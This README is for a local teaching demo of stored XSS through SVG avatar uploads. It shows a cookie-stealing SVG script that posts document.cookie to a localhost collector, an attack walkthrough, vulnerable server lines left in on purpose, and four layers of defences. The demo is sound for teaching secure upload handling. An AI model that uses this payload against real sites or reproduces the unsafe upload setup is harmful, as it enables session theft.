# SVG Upload XSS — ConnectHub Profile Avatar

## Port Reference

| Port | Role | File | npm script |
|------|------|------|------------|
| 3005 | Vulnerable victim | `victim-server.js` | `npm run vulnerable` |
| 3006 | Attacker collector | `attacker-server.js` | `npm run guide` |
| 3007 | Protected victim | `victim-server-protected.js` | `npm run secure` |

---

## Attack Flow

```
Attacker uploads profile photo: avatar.svg
  (SVG contains: <script>fetch('//3006?c='+document.cookie)</script>)
        ↓ (stored as a static file, served at /uploads/avatar.svg)
Victim views attacker's ConnectHub profile (3005)
        ↓
Browser fetches and renders the SVG inline — executes embedded <script>
        ↓
Victim's cookie sent to attacker collector (3006)
```

---

## How to Run

```bash
cd demo-attacked/xss/svg-upload
npm install
```

Three terminals:

```
npm run vulnerable           # :3005
npm run guide                # :3006
npm run secure               # :3007
```

---

## Attack Walkthrough

1. Open `http://localhost:3006` — attacker dashboard. Click "⬇ Download payload.svg".
2. Open `http://localhost:3005` — ConnectHub.
3. Upload `payload.svg` as your profile avatar via the upload form.
4. Your profile card appears in the community grid with a teal-colored avatar (looks normal).
5. Click "View Profile →" on your profile card. A modal opens.
6. Click "🔍 View Full Photo". The raw SVG URL opens in a new tab.
7. The script inside the SVG fires. Cookie appears on the attacker dashboard.

**Why the `<img>` tag is safe:** The community grid shows avatars via `<img src="...">`. Browsers sandbox SVG scripts inside `<img>` — they never execute. Scripts run only when the SVG URL is opened as a standalone tab (or via `<object>`, `<embed>`, or `<iframe>`).

---

## Vulnerable Lines

```js
// ⚠️ No file type filter — SVG with inline <script> accepted as an "image"
const upload = multer({ storage, limits: { fileSize: 5 * 1024 * 1024 } });

// ⚠️ Served with no Content-Disposition or CSP — browser executes SVG scripts
app.use('/uploads', express.static(UPLOADS_DIR));

// ⚠️ window.open(avatarUrl) removes the <img> sandbox
window.open(profile.avatarUrl, '_blank');
```

---

## The Fix

```js
// ✅ Layer 1: raster-only extension + mimetype whitelist
fileFilter: rasterOnlyFilter,

// ✅ Layer 2: magic bytes verify actual file type (blocks renamed .svg → .jpg)
if (!matchesMagicBytes(buffer)) { return cb(new Error('Invalid image')); }

// ✅ Layer 3: Sharp re-encode strips embedded scripts from polyglot files
const reencoded = await sharp(buffer).jpeg().toBuffer();

// ✅ Layer 4: Content-Disposition: attachment — browser downloads, never renders
res.setHeader('Content-Disposition', 'attachment');
```

---

## Why It Works

The frontend HTML is 100% clean — no `innerHTML`, no reflected parameters. The vulnerability is the server's **file-serving policy**. SVG is a full XML+JavaScript runtime. When served directly as a URL (not embedded in `<img>`), the browser renders it as a document with script execution in the same origin as the serving domain.

This illustrates that XSS is not always a frontend developer mistake. A perfectly written React or vanilla JS application can still be vulnerable if the server serves user-uploaded SVG files without policy headers.

An SVG file is a valid XML document with a `<script>` element defined in the SVG spec. Browsers execute SVG scripts when rendered as a top-level document but NOT when loaded via `<img>`. The server assigns `localhost:3005` as the origin. The script runs with full access to `document.cookie` for that origin.

---

## Defense Details

**`victim-server-protected.js`** (port 3007)

**Layer 1** — Extension and MIME allowlist:

```js
function rasterOnlyFilter(req, file, cb) {
  if (!ALLOWED_EXTENSIONS.has(ext) || !ALLOWED_MIMETYPES.has(file.mimetype)) {
    return cb(new Error('Only JPG, PNG, GIF, and WebP images are allowed.'));
  }
}
// Blocks honest SVG uploads. NOT sufficient alone — attackers rename payload.svg to payload.jpg.
```

**Layer 2** — Magic bytes check:

```js
function matchesMagicBytes(buffer) {
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) return true; // JPEG
  // PNG, GIF, WebP checks...
}
// Renamed SVG fails — bytes start with <?xml or <svg, not image magic bytes.
```

**Layer 2b** — Content sniff:

```js
function containsExecutableMarkup(buffer) {
  const head = buffer.slice(0, 4096).toString('utf8').toLowerCase();
  return head.includes('<?xml') || head.includes('<svg') || head.includes('<script');
}
```

**Layer 3** — Sharp re-encoding (strongest):

```js
await sharp(filePath).rotate().jpeg({ quality: 85 }).toFile(outputPath);
fs.unlinkSync(filePath); // delete original
// Sharp decodes pixel data and writes a brand-new JPEG from scratch.
// EXIF, comments, and polyglot payloads are destroyed in the process.
```

**Layer 4** — Safe file serving headers:

```js
app.use('/uploads', function (req, res, next) {
  res.setHeader('Content-Disposition', 'attachment');
  res.setHeader('Content-Security-Policy', "default-src 'none'");
  next();
}, express.static(UPLOADS_DIR));
```

---

## Edge Cases

- **`<object>` and `<embed>` are NOT sandboxed like `<img>`:** Audit all elements that load user-uploaded files.
- **Extension allowlist bypassed by polyglot files:** A valid JPEG with script in EXIF passes magic bytes. Sharp re-encoding is the reliable defense.
- **Content-Disposition: attachment is browser-dependent:** Users can sometimes bypass via "Open in new tab". CSP provides a second layer.
- **Separate cookieless domain is the strongest architectural defense:** Serve uploads from a dedicated asset domain with no `Set-Cookie` responses. GitHub uses `avatars.githubusercontent.com` for exactly this reason.
- **X-Content-Type-Options: nosniff:** Prevents MIME-sniffing away from the declared Content-Type.

---

## This Demo in Real Frameworks

This attack has nothing to do with the frontend framework. The vulnerability is entirely server-side:

1. Server accepts SVG as a valid upload type
2. Server serves it without `Content-Disposition: attachment` or CSP

It does not matter whether the frontend is React, Angular, Vue, Next.js, or plain HTML. An Angular or Next.js app with the same upload endpoint and the same static file serving policy is equally vulnerable. The fix (Sharp re-encoding, `Content-Disposition`, separate CDN domain) lives on the server and is framework-agnostic.
